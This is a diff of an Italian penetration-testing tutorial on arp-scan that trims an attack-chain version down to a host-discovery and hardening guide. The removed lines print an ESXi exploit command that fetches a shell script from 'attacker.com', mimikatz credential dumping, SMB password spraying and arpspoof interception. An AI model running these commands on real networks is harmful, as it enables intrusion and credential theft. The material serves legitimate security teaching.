@@ -1,12 +1,7 @@
 ---
-title: >-
-  ARP-Scan Exploitation per Pivoting Interno: Host Discovery, Lateral Movement e
-  AD Compromise
+title: 'ARP-Scan Kali Linux: Scansione ARP e Host Discovery'
 slug: arp-scan
-description: >-
-  Arp-scan è il tool ideale per identificare dispositivi attivi nella rete LAN.
-  Usato in fase di ricognizione, bypassa firewall e filtri ICMP per scoprire
-  target nascosti.
+description: 'Guida ad ARP-Scan su Kali Linux per scoprire host nella rete locale: scansione ARP, IP, MAC, vendor, subnet, output e workflow di network reconnaissance.'
 image: /arpscan.webp
 draft: false
 date: 2026-01-26T00:00:00.000Z
@@ -16,344 +11,166 @@ subcategories:
   - recon
 tags:
   - arp-scan
+  - ARP Discovery
+  - Layer 2
+  - Network Reconnaissance
 ---
 
-# ARP-Scan Exploitation per Internal Pentest: Host Discovery, Lateral Movement e AD Compromise
+# ARP-Scan: Host Discovery, Enumerazione e Network Recon
 
-Hai ottenuto un foothold su una workstation interna dopo un phishing campaign. L'ICMP è filtrato dai firewall locali e hai bisogno di mappare rapidamente il broadcast domain per identificare target critici. ARP-scan diventa il tuo strumento principale per il reconnaissance silenzioso in ambienti segmentati.
+Hai un foothold su una workstation interna e l'ICMP è filtrato — `arp-scan` ti fa comunque mappare rapidamente chi c'è nel tuo stesso segmento Layer 2, prima di passare alla fase successiva di enumerazione dei servizi. Non è lo strumento che ti porta al Domain Admin: è quello che ti dice cosa c'è nel broadcast domain in cui ti trovi, appena entrato.
 
-## TL;DR Operativo (Flusso a Step)
+## Cos'è ARP-Scan
 
-1. **Foothold & Initial Enumeration:** Dopo l'accesso iniziale, identifica le interfacce di rete e le subnet disponibili.
-2. **Broadcast Domain Mapping:** Utilizza ARP-scan per enumerare tutti gli host vivi nel segmento L2, bypassando i filtri ICMP.
-3. **Target Profiling & Prioritization:** Analizza gli indirizzi MAC e i vendor OUI per identificare server, workstation critiche e dispositivi di rete.
-4. **Service Enumeration & Exploitation:** Scansiona i servizi sui target prioritari e sfrutta vulnerabilità specifiche per ottenere accesso.
-5. **Credential Harvesting & Pivot:** Estrai credenziali e utilizza il riuso delle password per muoverti lateralmente verso altri segmenti.
-6. **Active Directory Compromise:** Sfrutta la posizione privilegiata per attaccare i controller di dominio e ottenere il dominio completo.
+`arp-scan` invia richieste ARP a un range di indirizzi e registra chi risponde: IP, MAC e — tramite il database OUI — il vendor della scheda di rete. Funziona perché ARP è un protocollo non autenticato e necessario per qualsiasi comunicazione L2, quindi anche host che filtrano ICMP devono rispondere per poter comunicare sulla rete locale.
 
-***
+**Da non confondere con ARP spoofing:** `arp-scan` invia richieste per scoprire host — è discovery. L'ARP spoofing manipola le associazioni IP/MAC per intercettare traffico altrui — è un attacco attivo diverso, con rischi e regole d'ingaggio proprie, e non è l'argomento di questa guida.
 
-## Fase 1: Ricognizione & Enumeration
+## Preparare la Scansione
 
-**Scenario:** Sei su una workstation Windows 10 comprocessata con privilegi limitati. Devi comprendere l'ambiente di rete senza generare alert ICMP.
-
-**Identificazione del Contesto di Rete:**
+Prima di lanciare qualsiasi scan, identifica interfaccia e subnet effettiva:
 
 ```bash
-# Linux/Windows (con shell)
-ipconfig /all          # Windows
-ifconfig               # Linux
-ip addr show           # Linux moderno
-
-# Identifica le route e le subnet accessibili
-route print            # Windows
-ip route show          # Linux
+ip addr show
+ip route show
 ```
 
-**Scansione ARP del Broadcast Domain:**
+```bash
+# Windows, se sei su una shell Windows
+ipconfig /all
+route print
+```
+
+`arp-scan` lavora solo sull'interfaccia e la subnet che gli indichi: se sbagli l'una o l'altra, torna zero risultati anche se la rete è piena di host attivi.
+
+## Host Discovery
 
 ```bash
-# Scansione base del segmento locale
 sudo arp-scan --interface eth0 --localnet
+```
 
-# Scansione di subnet specifiche (multivendor environment)
+`--localnet` non scansiona "tutte le reti locali": usa la rete associata all'interfaccia indicata da `--interface`, calcolata da IP e subnet mask configurati su quell'interfaccia.
+
+Subnet esplicite, anche multiple in un solo comando:
+
+```bash
 sudo arp-scan --interface eth0 192.168.1.0/24 10.10.10.0/24 172.16.0.0/24
+```
 
-# Output pulito per automazione
+Output grezzo per pipeline successive:
+
+```bash
 sudo arp-scan --interface eth0 --localnet -x | cut -f1 > live_hosts.txt
 ```
 
-**Fingerprinting Avanzato via OUI:**
+`arp-scan` non è silenzioso: genera traffico broadcast osservabile da qualsiasi sistema di monitoraggio di rete. È **rapido**, non stealth — se ti serve minimizzare il rumore, modula la velocità, ma non trattarlo come invisibile.
+
+## Come Leggere l'Output
+
+```text
+192.168.1.10  aa:bb:cc:dd:ee:ff  VMware, Inc.
+```
+
+* **IP** — host raggiungibile nel tuo stesso segmento.
+* **MAC** — identificatore Layer 2 effettivamente osservato.
+* **Vendor (OUI)** — indicazione sul produttore della scheda di rete o sul contesto di virtualizzazione.
+
+**Cosa NON ti dice:** sistema operativo, ruolo del dispositivo, versione software o presenza di vulnerabilità. Un MAC con vendor "VMware" indica una scheda di rete virtuale — non "questo è un server", non "questo host è prioritario". L'OUI è un indizio preliminare da confermare, non una classificazione.
 
 ```bash
-# Identifica dispositivi critici per vendor
 sudo arp-scan --interface eth0 --localnet | tee full_scan.txt
-grep -i "cisco" full_scan.txt      # Switch, router
-grep -i "vmware" full_scan.txt     # Server virtuali
-grep -i "dell" full_scan.txt       # Server fisici
-grep -i "hp" full_scan.txt         # Stampanti, server
+grep -i "cisco" full_scan.txt
+grep -i "vmware" full_scan.txt
 ```
 
-***
-
-## Fase 2: Initial Exploitation
-
-**Prioritizzazione dei Target Basata su Profiling:**
-
-1. **Gateway (.1/.254):** Punto di ingresso per il pivot verso altri segmenti
-2. **Server (.10/.100/.200):** Obiettivi ad alto valore con dati sensibili
-3. **Infrastructure Devices:** DNS, DHCP, NTP - spesso trascurati nel patching
-4. **Management Interfaces:** iDRAC, iLO, IPMI - credenziali di default comuni
-
-**Service Enumeration Mirata:**
+Il passo dopo l'OUI è sempre lo stesso: verificare cosa gira davvero su quell'host.
 
 ```bash
-# Scansione rapida dei servizi sui target prioritari
-nmap -p 22,23,80,443,445,3389,5985,5986 -iL high_value_targets.txt --open -oG services_scan.gnmap
-
-# Identificazione delle versioni dei servizi
-nmap -sV -p 445,5985,5986 -iL windows_hosts.txt
+nmap -sV -p 22,80,443,445,3389,5985 -iL live_hosts.txt --open
 ```
 
-**Attack Chain Realistico: VMware ESXi Compromise**
+Da lì, in base ai servizi trovati, il workflow prosegue su [Nmap](https://hackita.it/articoli/nmap/), [SMB](https://hackita.it/articoli/smb/) o [LDAP](https://hackita.it/articoli/porta-389-ldap/) — non su `arp-scan`, il cui compito finisce con la lista di IP/MAC.
 
-1. Identificato MAC address con OUI VMware
-2. Scansione porta 443/tcp (vSphere Web Client)
-3. Versione rilevata: ESXi 6.7 senza patch
-4. Exploit CVE-2021-21974 per RCE
+## Analisi della Cache ARP Locale
 
 ```bash
-# Scansione del target VMware
-nmap -p 443 --script vmware-version 10.10.10.50
-
-# Exploit dell'ESXi
-python3 esxi_rce.py -t 10.10.10.50 -c "wget http://attacker.com/shell.sh -O /tmp/shell.sh"
+ip neigh show
 ```
-
-**Credential Spraying Mirato:**
 
 ```bash
-# Utilizza ARP-scan per identificare host Windows via OUI
-sudo arp-scan --interface eth0 --localnet | grep "Microsoft" | cut -f1 > windows_hosts.txt
-
-# Password spraying su SMB
-crackmapexec smb windows_hosts.txt -u 'Administrator' -p 'Company2023!' --continue-on-success
+# Windows
+arp -a
 ```
 
-***
+Questo comando mostra le associazioni IP↔MAC che il tuo sistema ha già risolto localmente — nient'altro. Non rivela frequenza di comunicazione tra host, relazioni di trust o rapporti AD: quelli richiedono altre fonti (log, LDAP, BloodHound), non la cache ARP.
 
-## Fase 3: Post-Compromise & Network Situational Awareness
+## Limiti di ARP-Scan
 
-**Analisi Avanzata della Topologia di Rete:**
+* **Non attraversa router.** ARP resta nel dominio broadcast locale: per una subnet remota serve discovery a Layer 3 o accesso diretto a quel segmento.
+* **Non fa VLAN hopping.** Se sei nella VLAN A, vedi solo la VLAN A. Passare a un'altra VLAN è una tecnica completamente diversa, non una funzione di `arp-scan`.
+* **Client isolation Wi-Fi lo blocca.** Se la rete Wi-Fi isola i client tra loro, non vedrai nulla anche essendo connesso.
+* **È rilevabile.** Un IDS/IPS moderno riconosce facilmente un volume anomalo di richieste ARP da una singola sorgente.
+
+## ARP-Scan vs Altre Tecniche di Discovery
+
+| Metodo            | Layer | Dove funziona        | Uso principale                                     |
+| ----------------- | ----- | -------------------- | -------------------------------------------------- |
+| ARP-scan          | L2    | Solo segmento locale | Host discovery quando ICMP è filtrato              |
+| Nmap `-PR`        | L2    | Solo segmento locale | ARP discovery integrato in una scansione più ampia |
+| ICMP (`nmap -sn`) | L3    | Reti instradate      | Host discovery generico, spesso filtrato           |
+| TCP/UDP discovery | L3/L4 | Reti instradate      | Discovery quando ICMP e ARP non sono utilizzabili  |
+
+`arp-scan` e `nmap -PR` fanno concettualmente la stessa cosa; `arp-scan` è spesso preferito quando vuoi solo il discovery L2 puro senza il resto della suite Nmap in mezzo.
+
+## Troubleshooting
+
+**Nessun host trovato** — verifica di aver indicato l'interfaccia giusta (`ip addr show` per controllare) e che la subnet passata corrisponda davvero a quella configurata.
+
+**Permission denied** — `arp-scan` richiede privilegi elevati per creare i pacchetti raw: usa `sudo`.
+
+**Zero risultati su Wi-Fi** — probabile client isolation attiva sull'access point: non è un problema di sintassi.
+
+**Host noti mancanti nell'output** — potrebbero essere su una VLAN diversa dalla tua: `arp-scan` non li vedrà comunque, serve un altro punto di accesso a quel segmento.
+
+## Detection & Hardening
+
+**Detection:** volume anomalo di richieste ARP da una singola sorgente in poco tempo, scansioni sequenziali di interi range in una finestra breve — segnali facilmente distinguibili con Dynamic ARP Inspection o un IDS con soglia sul traffico ARP.
+
+**Hardening:** segmentazione L2 più stretta, DHCP Snooping e Dynamic ARP Inspection sugli switch gestiti, client isolation sulle reti Wi-Fi dove non serve comunicazione diretta tra host, port security per limitare i MAC per porta.
+
+## Workflow: da Foothold a Target Prioritizzati
 
 ```bash
-# Mappa le connessioni attive dagli host compromessi
-netstat -an | findstr ESTABLISHED    # Windows
-ss -tpn | grep ESTAB                 # Linux
+# 1. Contesto di rete
+ip addr show
+ip route show
 
-# Analisi delle route interne per identificare subnet secondarie
-route print | findstr /v "0.0.0.0"   # Windows
-ip route | grep -v "default"         # Linux
+# 2. Discovery del segmento locale
+sudo arp-scan --interface eth0 --localnet | tee full_scan.txt
+
+# 3. Salva la lista IP per la fase successiva
+sudo arp-scan --interface eth0 --localnet -x | cut -f1 > live_hosts.txt
+
+# 4. Passa alla service enumeration
+nmap -sV -iL live_hosts.txt --open -p 22,80,443,445,3389,5985
 ```
 
-**ARP Cache Analysis per Trust Relationships:**
+Da qui il lavoro prosegue con gli strumenti giusti per ciascun servizio trovato — [smbclient](https://hackita.it/articoli/smbclient/) per SMB, [ldapsearch](https://hackita.it/articoli/ldapsearch/) per LDAP, e così via. `arp-scan` ha già fatto il suo lavoro: darti la lista di chi c'è.
 
-```bash
-# Analisi della cache ARP per identificare comunicazioni frequenti
-arp -a | findstr dynamic             # Windows
-ip neigh show                        # Linux
+## FAQ
 
-# Cerca host che comunicano regolarmente tra loro
-# (potenziali trust relationships da sfruttare)
-```
-
-**Credential Harvesting Strategico:**
-
-```bash
-# Estrazione credenziali da memoria (Windows)
-mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
-
-# Ricerca file di configurazione con password (Linux/Windows)
-find / -name "*.config" -o -name "*.xml" -o -name "*pass*" -type f 2>/dev/null
-dir /s *pass* *cred* *config*        # Windows
-```
-
-**SMB Abuse & Kerberos Targeting:**
-
-```bash
-# Enumera le share SMB disponibili
-smbclient -L 10.10.10.100 -N
-
-# Tenta di montare share interessanti
-mount -t cifs //10.10.10.100/IT_Share /mnt/share -o user=guest
-```
-
-***
-
-## Fase 4: Lateral Movement & Strategic Pivoting
-
-**Considerazioni Strategiche per ARP Spoofing:**
-
-* **Quando Usarlo:** In segmenti poco monitorati, per intercettare traffico verso target specifici
-* **Quando Evitarlo:** In ambienti con detection avanzata, NAC, o segmenti critici
-* **Impatto Operativo:** Genera rumore ma può fornire credenziali in chiaro
-
-**Pivoting tra Broadcast Domains:**
-
-```bash
-# Identifica host multi-homed (connessi a più subnet)
-ipconfig /all | findstr "IPv4"       # Windows
-ip addr show | grep inet             # Linux
-
-# Utilizza host compromessi come pivot
-ssh -D 1080 -C -N user@compromised-host
-
-# Scansione della rete interna attraverso il pivot
-proxychains nmap -sT -p 445 172.16.100.0/24
-```
-
-**ARP Spoofing per Intercettazione Mirata:**
-
-```bash
-# Intercetta solo il traffico verso il gateway
-arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
-
-# Monitora il traffico intercettato per credenziali
-tcpdump -i eth0 -A port 80 or port 21 or port 23
-```
-
-**VLAN Hopping Considerations:**
-
-* ARP-scan funziona solo all'interno della VLAN corrente
-* Per attraversare VLAN serve accesso a trunk port o VLAN hopping exploit
-* In ambienti enterprise, il movimento tra VLAN richiede compromissione del networking equipment
-
-***
-
-## Fase 5: Detection & Enterprise Hardening
-
-**Indicatori di Compromissione Avanzati:**
-
-**Log di Switch Enterprise (Cisco IOS):**
-
-```bash
-# ARP Storm Detection logs
-%SW_DAI-4-DHCP_SNOOPING_DENY: 1 Invalid ARPs (Req) on Gi1/0/1
-
-# Port Security Violation
-%PM-4-ERR_DISABLE: psecure-violation error detected on Gi1/0/2
-```
-
-**Configurazione IDS/IPS per ARP Anomalies:**
-
-```yaml
-# Suricata rule per ARP scanning
-alert arp any any -> any any (msg:"ARP Scan Detected"; arp.opcode == 1; threshold: type threshold, track by_src, count 100, seconds 10; sid:2023001; rev:1;)
-
-# ARP spoofing detection
-alert arp any any -> any any (msg:"Possible ARP Spoofing"; arp.hw.len != 6 or arp.proto.len != 4 or arp.hw.type != 1 or arp.proto.type != 0x0800; sid:2023002; rev:1;)
-```
-
-**Hardening Enterprise-Grade:**
-
-**Switch Configuration (Cisco):**
-
-```bash
-# Abilita DHCP Snooping e Dynamic ARP Inspection
-ip dhcp snooping vlan 10,20,30
-ip dhcp snooping
-ip arp inspection vlan 10,20,30
-ip arp inspection validate src-mac dst-mac ip
-
-# Port Security
-interface GigabitEthernet1/0/1
- switchport port-security maximum 3
- switchport port-security violation restrict
- switchport port-security aging time 10
-```
-
-**Endpoint Protection:**
-
-```bash
-# Windows: ARP cache protection
-netsh interface ipv4 set interface "Ethernet" arpfilter=enabled
-
-# Linux: arpwatch per monitoraggio ARP
-apt install arpwatch
-systemctl start arpwatch
-```
-
-***
-
-## Limitazioni di ARP-Scan in Ambienti Enterprise
-
-1. **Layer 2 Boundary:** ARP non attraversa router, limitando la visibilità alle subnet remote
-2. **Detection Evidente:** Scan ARP aggressivi sono facilmente rilevabili da IDS/IPS moderni
-3. **WiFi Isolation:** In ambienti WiFi enterprise con client isolation, ARP-scan non funziona
-4. **NAC Aggressivo:** Network Access Control può bloccare porte quando rileva ARP scanning
-5. **VLAN Segmentation:** In ambienti multi-VLAN, serve accesso a ciascuna VLAN separatamente
-
-***
-
-## Errori Comuni Che Vedo Negli Assessment Reali
-
-1. **Flat Network Architecture:** Segmenti di rete non separati che permettono ARP scanning completo dell'infrastruttura
-2. **Missing ARP Monitoring:** Nessun sistema di alerting per ARP storms o spoofing attempts
-3. **Credential Reuse Across Segments:** Stesse credenziali amministrative utilizzate su VLAN diverse
-4. **Lack of Port Security:** Switch senza port security che permettono MAC flooding attacks
-5. **Insufficient Logging:** Nessun logging degli eventi ARP a livello di switch o endpoint
-6. **Static ARP Entries Missing:** Dispositivi critici senza ARP static entries, vulnerabili a spoofing
-
-***
-
-## FAQ Tecniche
-
-**ARP-scan funziona su VLAN diverse?**
-No. ARP opera al layer 2 e non attraversa i confini delle VLAN senza routing appropriato o tecniche di VLAN hopping.
+**ARP-scan funziona tra VLAN diverse?**
+No. ARP opera al Layer 2 e non attraversa i confini di VLAN senza routing o accesso diretto al segmento di destinazione.
 
 **ARP-scan è stealth?**
-No. Genera traffico broadcast rilevabile da IDS e sistemi di monitoraggio della rete. La velocità può essere modulata ma resta rilevabile.
+No, genera traffico broadcast rilevabile da qualsiasi monitoraggio di rete. È rapido, non silenzioso.
 
 **Qual è la differenza tra arp-scan e nmap -PR?**
-Entrambi utilizzano ARP per host discovery, ma nmap -PR è integrato in una suite più ampia di tecniche di scanning, mentre arp-scan è specializzato e spesso più veloce nel segmento L2.
+Fanno discovery L2 nello stesso modo; `arp-scan` è uno strumento dedicato e spesso più rapido quando ti serve solo quello, senza il resto della suite Nmap.
+
+**La cache ARP mostra le relazioni di trust tra host?**
+No, mostra solo le associazioni IP↔MAC già risolte localmente dal tuo sistema — niente di più.
 
 ***
 
-## Tabella Comparativa: Host Discovery Methods
-
-| Tecnica         | Layer | Stealth | Velocità | Affidabilità | Rilevamento |
-| --------------- | ----- | ------- | -------- | ------------ | ----------- |
-| ARP-scan        | L2    | Bassa   | Alta     | Alta         | Alta        |
-| Nmap -sn (ICMP) | L3    | Media   | Media    | Media        | Media       |
-| Nmap -PR (ARP)  | L2    | Bassa   | Alta     | Alta         | Alta        |
-| TCP SYN Ping    | L4    | Alta    | Bassa    | Alta         | Bassa       |
-| UDP Ping        | L4    | Alta    | Bassa    | Variabile    | Bassa       |
-
-***
-
-## Playbook Operativo 80/20: Internal Network Compromise
-
-| Obiettivo                       | Azione Concreta                            | Comando/Tool Esempio                                       |
-| ------------------------------- | ------------------------------------------ | ---------------------------------------------------------- |
-| Mappatura broadcast domain      | Scansione ARP completa del segmento        | `sudo arp-scan --interface eth0 --localnet`                |
-| Identificazione target critici  | Profiling via OUI e analisi pattern IP     | `grep -E "(VMware\|Cisco\|Microsoft)"`                     |
-| Enumerazione servizi            | Scansione mirata su target prioritari      | `nmap -p 445,5985,3389 -iL windows_hosts.txt`              |
-| Sfruttamento iniziale           | Credential spraying su servizi esposti     | `crackmapexec smb targets.txt -u userlist -p passlist`     |
-| Pivot tra segmenti              | Utilizzo host compromessi come jump box    | `ssh -D 1080 -C -N user@pivot-host`                        |
-| Compromissione Active Directory | Attacco Kerberos e movimento laterale AD   | `bloodhound-python -d domain.local -u user -p pass -c All` |
-| Hardening detection             | Monitoraggio ARP anomalies e port security | Configurazione switch enterprise + IDS rules               |
-
-***
-
-## Lab Avanzato: Internal AD Pivot & Domain Compromise
-
-**Scenario "EnterpriseBreach":** Replica un ambiente aziendale con Active Directory complesso, multi-VLAN e sistemi legacy.
-
-**Fasi del Lab:**
-
-1. **Initial Foothold:** Accesso a workstation via phishing simulato
-2. **Network Reconnaissance:** Mappatura completa dei segmenti L2/L3 utilizzando tecniche combinate
-3. **Privilege Escalation:** Sfruttamento vulnerabilità su server identifcati via fingerprinting
-4. **Lateral Movement:** Pivot tra VLAN utilizzando credenziali raccolte e trust relationships
-5. **Domain Dominance:** Compromissione completa dell'Active Directory attraverso attacchi Kerberos avanzati
-
-**Cosa Imparerai:**
-
-* Triage efficace degli host in ambienti enterprise complessi
-* Tecniche di movimento laterale in reti segmentate
-* Strategie per evitare detection durante l'host discovery
-* Metodologie per la compromissione di Active Directory partendo da un accesso limitato
-
-**Per team e aziende:** Offriamo percorsi formativi personalizzati e servizi di assessment per testare la resilienza della tua infrastruttura. **[Scopri i nostri servizi per enterprise](https://hackita.it/servizi)**
-
-**Supporta il progetto** per mantenere accessibili contenuti tecnici di qualità: **[Supporta HackITA](https://hackita.it/supporta)**
-
-***
-
-## Riferimenti Tecnici Esterni
-
-* [https://nmap.org/book/man-host-discovery.html](https://nmap.org/book/man-host-discovery.html)
-* [https://linux.die.net/man/1/arp-scan](https://linux.die.net/man/1/arp-scan)
-* [https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/)
-
-*Questa guida è per scopi formativi in ambienti controllati e autorizzati. Ogni test su sistemi di terze parti richiede autorizzazione scritta esplicita.*
+Uso esclusivo in ambienti autorizzati (lab, CTF, HTB, PG o assessment con consenso scritto).
